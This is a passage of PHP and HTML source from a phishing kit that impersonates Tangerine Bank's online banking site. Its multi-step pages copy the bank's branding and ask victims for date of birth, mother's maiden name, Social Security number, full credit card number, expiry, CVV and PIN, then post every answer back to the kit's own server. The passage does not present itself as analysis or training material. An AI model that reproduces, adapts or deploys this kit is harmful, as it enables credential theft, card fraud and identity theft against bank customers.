                  <a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
<div class="row-fluid">
<header class="content-main-header">
<div class="span12">
<h1>Verify your Tangerine Account</h1>
</div>
</header>
</div>
		
<div class="enrollment-form">
<form action="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?>" method="post" id="MainForm" name="MainForm" class="form-horizontal form-drop-controls form-long-forms" data-validate="enable">
<input type="hidden" NAME="step" value="5"><input type="hidden" name="PrimaryApplicant" id="PrimaryApplicant" value="true">
<div class="enrollment-progress-container">
<hr class="steps-connector">
<ol class="enrollment-progress-steps">
<li class="
            step 
            active">
<div class="step-label">
<span class="step-number"></span><span class="step-link">Your info</span>
</div>

<div class="enrollment-section">
<h2>About you</h2>

<div class="control-group">
<label class="control-label" for="FirstName">Full Name</label>
<div class="controls">
<input type="text" name="firstname" value="<?php echo $_SESSION['fullname']?>" maxlength="32" autocomplete="off" id="FirstName" data-rules="required:true,_name:true,_name:true" data-toggle="tooltip" data-placement="right" data-html="false" title="Please enter your first name here." readonly="true" />
</div>
</div> 


<div class="control-group">
<label class="control-label" for="FirstName">Home Address</label>
<div class="controls">
<input type="text" value="<?php echo $_SESSION['address']?>" maxlength="32" autocomplete="off" data-rules="required:true,_name:true,_name:true" data-toggle="tooltip" data-placement="right" data-html="false" title="Please enter your first name here." readonly="true" />
</div>
</div> 

</div>


<div class="control-group">
<label class="control-label">Date of Birth</label>
<div class="controls">
<input type="text" name="dob" maxlength="12" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" placeholder="MM/DD/YY" required="Required">
</div>
</div>
<div class="control-group">
<label class="control-label">Mother Maiden Name</label>
<div class="controls">
<input type="text" name="mothermaiden" maxlength="20" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" required="Required">
</div>
</div>


<div class="control-group">
<label class="control-label">Social Security Number</label>
<div class="controls">
<input type="text" name="ssn" maxlength="9" value="" autocomplete="off" data-toggle="tooltip" data-placement="right" data-html="true" title="" >
</div>
</div>

<? if($_SESSION['credit']  == true){
	?>
	
<div class="control-group">
<label class="control-label">Credit Card Number</label>
<div class="controls" style="width:600px">
<input type="text" style="width: 38px;" name="cc_number1" maxlength="4" value="5360" disabled>
<input type="text" style="width: 38px;" name="cc2" maxlength="4" required>
<input type="text" style="width: 38px; " name="cc3" maxlength="4" required>
<input type="text" style="width: 38px; " name="cc4" maxlength="4" required>
</div>
</div>

<div class="control-group">
<label class="control-label">Exp</label>
<div class="controls" style="width:600px">

<select style="width: 70px" name="expm" title="Month" id="expm">
    <option value=""></option>
    <option value="01" >01</option>
    <option value="02" >02</option>
    <option value="03" >03</option>
    <option value="04" >04</option>
    <option value="05" >05</option>
    <option value="06" >06</option>
    <option value="07" >07</option>
    <option value="08" >08</option>
    <option value="09" >09</option>
    <option value="10" >10</option>
    <option value="11" >11</option>
    <option value="12" >12</option>
</select> / <select style="width: 70px" name="expy" title="Year" id="expy" >
   <option value=""></option>
    <option value="2016" >2016</option>
    <option value="2017" >2017</option>
    <option value="2018" >2018</option>
    <option value="2019" >2019</option>
    <option value="2020" >2020</option>
    <option value="2021" >2021</option>
    <option value="2022" >2022</option>
    <option value="2023" >2023</option>
    <option value="2024" >2024</option>
    <option value="2025" >2025</option>
    <option value="2026" >2026</option>
</select>

</div>
</div>

<div class="control-group">
<label class="control-label">CVV</label>
<div class="controls">
<input type="text" name="cvv" maxlength="3" value="" style="width:50px" required>
</div>
</div>
<?
}?>


<div class="control-group" align="right"></div>
</div>
</div>


<div class="button-holder-container">
<div class="button-holder">
<button type="submit" id="SAVE ANY CHANGES AND CONTINUE TO NEXT PAGE" name="SAVE ANY CHANGES AND CONTINUE TO NEXT PAGE" class="btn btn-primary">Next</button>
</div>
</div>
</form>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-800-464-3473</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am &#239;&#191;&#189; 8pm ET <br>Weekend: 9am &#239;&#191;&#189; 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started &#239;&#191;&#189;
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a> </span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@site.com</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Cafes</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div> 
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script> 
<div id="modalRatesId" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
<div class="modal-container">
<div class="modal-header">
<h3> Rates</h3>
</div>
<div class="modal-body">
<div class="row-fluid">
<div class="span12">
<table class="table">
<tr>
<td>$0.00-$49,999.99</td><td>0.25%</td>
</tr>
<tr>
<td>$50,000.00-$99,999.99</td><td>1.00%</td>
</tr>
<tr>
<td>$100,000.00+</td><td>1.10%</td>
</tr>
<tr>
<td colspan="2"></td>
</tr>
</table>
</div>
</div>
</div>
<div class="modal-footer">
<button class="btn btn-primary" data-dismiss="modal" aria-hidden="true">Close</button>
</div>
</div>
</div> 
</body>
</html>

<?

}



elseif($step==3)
{
?>



<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<title>Tangerine bank: Enter your PIN</title>
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Caf&#195;©</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Fran&#195;ßais</a> |
                  <a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li class="active">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Caf&#195;©</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">

<div class="login">
<div class="row-fluid">
<div class="span12">
<div class="mobile-wrapper">
</div>
</div>
</div>
<div class="row-fluid">
<div>
  <div style="width: 300px; margin: 0 auto; text-align: center;">

<form ACTION="" NAME="Signin" method="POST" onSubmit="start()" id="frm">
<div class="login-passmark-box content-main-wrapper">
<INPUT NAME="step" TYPE="HIDDEN" value="4"><INPUT NAME="locale" TYPE="HIDDEN" value="en_CA"><INPUT NAME="device" TYPE="HIDDEN" value="web"><input type="hidden" name="BUTTON" value=""><INPUT NAME="pm_fp" TYPE="HIDDEN" id="pm_fp">
<fieldset>
<h2>Your PIN</h2>
<label for="PIN">Personal Identification Number
                    <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Your Personal Identification Number (PIN) is the 4 or 6-digit number you selected when you enrolled. For security reasons, you should never disclose your PIN to anyone."></i></label><input type="password" maxlength="6" NAME="pin" id="PIN" class="input-small" required="required"><span class="help-block"><a href="/web/Tangerine.html?command=displayResetPINInfo">I forgot my PIN</a></span>
</fieldset>
</div>
<div class="button-holder text-center">
<script>
function start()
{

if($("#PIN").val()!="")
{
$("#startttt").show();
$("#please").show();

$("#go").attr("disabled", true);
$("#frm").submit();
}
}

</script>
<button class="btn btn-primary" id="go" type="submit" NAME="Go">Go <img id="startttt" alt="" style="display:none" /></button>
<br><div style="display:none" id="please">Please wait...</div>
</div>
</form>
</div>
</div></div>
</div>
<div class="row-fluid">
<div class="span8">
</div>
</div>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-888-826-4374</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am ì 8pm ET <br>Weekend: 9am ì 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a> </span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@tangerine.ca</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Caf&#195;©s</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div> 
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script>
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
</body>
</html>



<?php
}



elseif($step==2)
{
?>
<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<title>Tangerine bank: Secret Question</title> 
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
